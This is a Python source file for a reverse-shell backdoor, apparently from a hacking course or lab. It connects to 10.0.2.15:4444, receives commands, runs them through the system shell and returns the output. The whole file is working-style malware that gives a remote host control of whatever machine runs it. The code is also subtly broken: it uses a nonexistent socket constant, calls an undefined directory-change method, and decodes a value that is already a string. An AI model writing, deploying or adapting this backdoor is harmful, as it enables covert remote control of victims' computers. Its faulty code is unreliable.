import socket
import subprocess
import json
import os


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCKSTREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('utf-8'))
        self.connection.send(json_data.encode('ASCII'))

    def reliable_receive(self):
        json_data = ''
        while(True):
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == 'exit':
                self.connection.close()
                exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            else:
                command_result = self.execute_system_command(
                    command).decode('utf-8')

            self.reliable_send(command_result)

        self.connection.close()


my_backdoor = Backdoor('10.0.2.15', 4444)
my_backdoor.run()
